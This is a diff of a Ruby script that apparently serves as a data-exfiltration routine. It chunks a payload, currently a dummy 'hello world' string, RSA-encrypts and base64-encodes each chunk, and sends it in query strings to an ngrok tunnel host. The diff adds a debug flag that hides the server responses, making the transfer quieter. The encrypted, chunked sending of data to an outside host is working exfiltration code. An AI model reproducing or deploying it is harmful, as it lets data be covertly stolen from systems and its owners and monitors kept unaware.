@@ -52,11 +52,12 @@ require 'base64'
 require 'net/http'
 require 'uri'
 
+debug = false
 payload = "hello world " * 1000
 public_key = OpenSSL::PKey::RSA.new("-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvXmwmaNq0EmOUOYh4tOh\nd4VYOdr3CmCRcS3FVyjt473v+KFqQElB3domKHRQt4yAaAly4Yi9m6DbMOTzOL5E\ni8lkY4Y9Lw0n7VFLiqVGQQOObAcdyEQ7G5kCZ6xAk7xoF25kXfSkAPpaejvGZKeR\niX0PVLygfrUT/p9grc3nTJGk1COH7dHX7HTW8eO8XZDsiRFqLy2K6LVw4ZTkfjMT\n24imFKPuXKT0twmrEpxdKmLv2pCH82VHuu+QWRhxD9E46heAvYvaz0SXt1zNK7wc\nz47A/Pzw+MJcc9jjDkYaCqv2gr1K0ZCANL/2j49a1aoXicn1HGdqrTzSBjhsSWiB\nKwIDAQAB\n-----END PUBLIC KEY-----\n")
 chunks = payload.scan(/.{1,#{public_key.n.num_bytes - 42}}/)
 midx = (0...10).map { ('a'..'z').to_a[rand(26)] }.join
-chunks.each_with_index { |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("https://f8d5-98-225-53-234.ngrok-free.app/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" }
+chunks.each_with_index { |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("https://f8d5-98-225-53-234.ngrok-free.app/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" if debug }
 
 =================================
 
